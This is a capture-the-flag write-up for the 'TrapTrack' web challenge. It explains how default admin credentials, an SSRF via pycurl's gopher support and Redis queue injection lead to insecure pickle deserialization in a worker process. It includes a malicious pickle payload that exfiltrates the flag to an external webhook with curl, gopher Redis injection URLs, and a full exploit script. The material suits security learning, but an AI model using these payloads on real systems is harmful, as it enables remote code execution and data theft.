# TrapTrack :: Hard

This challenge was a pure blast.  
The whole concept is super fun and interesting.  
It is defintely a new twist for me on the Redis exploitaiton side of CTFs.  


## Scenario


```
The aliens have prepared several trap websites to spread their propaganda campaigns on the internet.
Our intergalactic forensics team has recovered an artifact of their health check portal that keeps track of their trap websites.
Can you take a look and see if you can infiltrate their system?
```


## Solve

### Understanding what it does

![](/images/traptrack-source-tree.png)

We begin the challenge and we are greeted with a login page.  

![](/images/traptrack-login.png)

This is a Flask application.  
A quick peek at the `config.py` file reveals that the administrator account credentials are simply `admin:admin`.  

From there we can login.  

![](/images/traptrack-dashboard.png)

The design of this application is fun play with.  

It is a site in which we can add healthchecks for various sites.  

These healthchecks are then executed, and the results are shown with a red or green dot as shown above.  

Each healthcheck consists of a `url` and a `name`.  

![](/images/traptrack-create-trap.png)

Once we submit our healthcheck, the fun begins.  

We send a post request to `/tracks/add`.  

```python
@api.route('/tracks/add', methods=['POST'])
@login_required
def tracks_add():
    if not request.is_json:
        return response('Missing required parameters!', 401)

    data = request.get_json()

    trapName = data.get('trapName', '')
    trapURL = data.get('trapURL', '')

    if not trapName or not trapURL:
        return response('Missing required parameters!', 401)

    async_job = create_job_queue(trapName, trapURL)

    track = TrapTracks(trap_name=trapName, trap_url=trapURL, track_cron_id=async_job['job_id'])

    db.session.add(track)
    db.session.commit()

    return response('Trap Track added successfully!', 200)
```

This job extracts the information from the json body of our request.  
It does some validation and then calls `create_job_queue`, which sounds interesting.  

This function is located in the `cache.py` file.  

```python
def create_job_queue(trapName, trapURL):
    job_id = get_job_id()

    data = {
        'job_id': int(job_id),
        'trap_name': trapName,
        'trap_url': trapURL,
        'completed': 0,
        'inprogress': 0,
        'health': 0
    }

    current_app.redis.hset(env('REDIS_JOBS'), job_id, base64.b64encode(pickle.dumps(data)))

    current_app.redis.rpush(env('REDIS_QUEUE'), job_id)

```

We seem to be adding a serialized `data` object to a `redis hash`. 1337 
We add the data and use the `job_id` as the key identifying our data.  

Afterwards, the application takes the `job_id`, and pushes it on a `redis list`.  
This list is called `REDIS_QUEUE`, so I imagine it is used as such.  

### Analyzing the worker

We have to find out how this queue and our data is consumed.  

There is a `worker` folder, included with the sources.  
It is a completely separate python process, that consumes and executes the healthchecks added to the queue.  

Let's analyze its source a bit.  

The config section is interesting:  

```python
config = {
    'REDIS_HOST' : '127.0.0.1',
    'REDIS_PORT' : 6379,
    'REDIS_JOBS' : 'jobs',
    'REDIS_QUEUE' : 'jobqueue',
    'REDIS_NUM_JOBS' : 100
}
```

This precises that `REDIS_QUEUE` is `jobsqueue` and `REDIS_JOBS` is `jobs`.  
We have to keep that in mind if we need to contact redis further down this challenge.  

```python
def run_worker():
    job = get_work_item()
    if not job:
        return

    incr_field(job, 'inprogress')

    trapURL = job['trap_url']

    response = request(trapURL)

    set_field(job, 'health', 1 if response else 0)

    incr_field(job, 'completed')
    decr_field(job, 'inprogress')

if __name__ == '__main__':
    while True:
        time.sleep(10)
        run_worker()
```

The worker executes the `run_worker` function every 10 seconds, forever.  

The `run_worker` function, starts by getting the value for the `job` variable from the result of a call to `get_work_item`.  

Let's see what it does:  

```python
def get_work_item():
    job_id = store.rpop(env('REDIS_QUEUE'))
    if not job_id:
        return False

    data = store.hget(env('REDIS_JOBS'), job_id)

    job = pickle.loads(base64.b64decode(data))
    return job
```

This pops the last element on the `jobsqueue` list.  
This return a `job_id`, which is in turn used to gather the data from `jobs`.  
Once the data is obtained, it is decoded and then __deserialized__.  

This is our target.  

Let's see how the healthchecks are done.  
This is done in the `healthcheck.py` file of the worker script.  

```python
import pycurl

def request(url):
    response = False
    try:
        c = pycurl.Curl()
        c.setopt(c.URL, url)
        c.setopt(c.TIMEOUT, 5)
        c.setopt(c.VERBOSE, True)
        c.setopt(c.FOLLOWLOCATION, True) # ?

        response = c.perform_rb().decode('utf-8', errors='ignore')
        c.close()
    finally:
        return response
```

Now this is an important thing.  

The `pycurl` library seems to be bindings for `libcurl`.  
This is an important detail, since `libcurl` implements many protocols.  

One such protocol is `GOPHER`, and it is known to interact really well with redis.  
Since redis uses a ![text based protocol](https://redis.io/commands/), `GOPHER` is perfect to communicate this raw text.  

Only the first character is truncated in `GOPHER`, otherwise it is just text, which is perfect.  

If we do this request:  
```
curl gopher://localhost:1338/HELLO%20WORLD
```

The received data ends up being:  

![](/images/traptrack-gopher.png)

So we need to add a sacrificial character.  

```bash
curl gopher://localhost:6379/_CONFIG%20GET%0aQUIT
```

With this, we can communicate with redis.  

Now our goal is to place a malicious pickle inside of a `jobs` entry.  
And then have the worker deserialize that data to get RCE.  

To do so, we can use the healthchecks.  
We can do it in two requests.  

- The first request will place the pickle payload inside of the `jobs` hash.
  This payload will be identified with a key that could not be normally reached, such as `9999`.

- Then we can trigger the exploit by placing our key (in this case `9999`), in last position of the `jobsqueue`.
  This will place the payload for the next time the `worker` is checking the queue.
  If all goes well our exploit runs and we get the flag.


Here is the first gopher request:


```
gopher://localhost:6379/_HSET%20jobs%201337%20<base64-pickle-payload>%0aQUIT
```

The pickle payload can be generated with this snippet:

```python
import base64
import pickle

class Ted():
    # No one likes ted..
    def __reduce__(self):
        return __import__('os').system, ("curl https://<your-hook>/$(/readflag|base64 -w0)",)

if __name__ == "__main__":
	t = Ted()
	print(base64.b64encode(pickle.dumps(t)).encode('utf-8'))
```

Then, we can add our id to the job queue:

```
gopher://localhost:6379/_RPUSH%20jobqueue%209999%0aQUIT
```

Note that the `%0aQUIT` is most likely optional, but it prevents the connection from hanging behind the scenes.  
redis will keep the connection alive a while if it is not explicitly ended.  


## Scripts

```python
import pickle
import time
import requests
from base64 import b64encode

STAGE_1  = "gopher://localhost:6379/_HSET%20jobs%201337%20{}%0aQUIT"
STAGE_2  = "gopher://localhost:6379/_RPUSH%20jobqueue%201337%0aQUIT"
PING = "curl https://webhook.site/3578d2dc-d2dd-468b-a8c9-9bda1f8d1281/$(/readflag|base64 -w0)"

TARGET = "http://localhost:1337"
ADD_TRACKS_ENDPOINT = "/api/tracks/add"
LOGIN_ENDPOINT = "/api/login"

class Ted():
    # No one likes ted..
    def __reduce__(self):
        return __import__('os').system, (PING,)

def setup_trap(s: requests.Session, url: str) -> (int, str):
    r = s.post(TARGET + ADD_TRACKS_ENDPOINT, 
                  json={"trapName": ":: Gh0sted :: ", "trapURL": url})
    return (r.status_code, r.text)


if __name__ == "__main__":
    s = requests.Session()
    print("[*] Logging in ")
    s.post(TARGET + LOGIN_ENDPOINT, json={"username": "admin", "password": "admin"})

    print("[*] Launching stage 1")
    ted = Ted()
    dilled_vengeance = b64encode(pickle.dumps(ted)).decode('utf-8')
    print("[?] PICKLE: ", dilled_vengeance)
    code, content = setup_trap(s, STAGE_1.format(dilled_vengeance))
    print("[?] CODE:", code)
    print("[?] CONTENT:", content)

    time.sleep(10)

    print("[*] Launching stage 2")
    code, content =  setup_trap(s, STAGE_2)
    print("[?] CODE:", code)
    print("[?] CONTENT:", content)

```

This was a fun challenge.
